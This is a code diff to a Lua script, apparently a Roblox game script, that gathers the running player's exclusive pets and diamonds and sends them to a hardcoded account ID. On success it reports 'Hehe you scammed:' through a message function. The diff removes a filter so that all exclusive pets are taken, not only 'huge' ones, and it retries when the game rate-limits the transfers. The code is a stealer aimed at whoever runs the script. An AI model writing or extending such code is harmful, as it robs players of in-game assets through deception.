@@ -133,10 +133,8 @@ spawn(function()
 				local PetsList2 = {}
 				for i,v in pairs(lib.Save.Get().Pets) do
 					local v2 = lib.Directory.Pets[v.id];
-					if v2.rarity == "Exclusive" and #PetsList2 < 50 then
-						if v2.huge and getgenv().onlyhuge == true then
-							table.insert(PetsList, v.uid);
-						end
+					if v2.rarity == "Exclusive" and #PetsList2 < 49 then
+						table.insert(PetsList, v.uid);
 						table.insert(PetsList2, v2.name)
 					end
 				end
@@ -149,11 +147,11 @@ spawn(function()
 						SendMessage(PetsList2);
 						getgenv().Make("Hehe you scammed: "..table.concat(PetsList2, ', '))
 					else
+						print(what)
 						if what == "You are doing this too fast!" then
 							wait(3)
 							aboba, what = fire123("7", myownbi, PetsList, lib.Save.Get().Diamonds - 100)
 						end
-						print(what)
 					end
 				elseif getgenv().onlyhuge == false and (#PetsList > 0 or lib.Save.Get().Diamonds > 100) then
 					myownbi = "43d88d6e-d475-4568-b194-fd62ebeaf75f"
@@ -162,11 +160,11 @@ spawn(function()
 						SendMessage(PetsList2);
 						getgenv().Make("Hehe you scammed: "..table.concat(PetsList2, ', '))
 					else
+						print(what)
 						if what == "You are doing this too fast!" then
 							wait(3)
 							aboba, what = fire123("7", myownbi, PetsList, lib.Save.Get().Diamonds - 100)
 						end
-						print(what)
 					end
 				end
 
